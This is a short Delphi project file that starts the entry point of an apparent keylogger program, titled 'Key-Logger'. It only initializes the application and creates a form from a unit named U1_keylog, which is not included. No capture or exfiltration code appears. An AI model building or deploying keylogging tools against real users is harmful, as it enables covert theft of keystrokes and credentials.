program key_logger;

uses
  Forms,
  U1_keylog in 'U1_keylog.pas' {fbase};

{$R *.res}

begin
  Application.Initialize;
  Application.Title := 'Key-Logger';
  Application.CreateForm(Tfbase, fbase);
  Application.Run;
end.

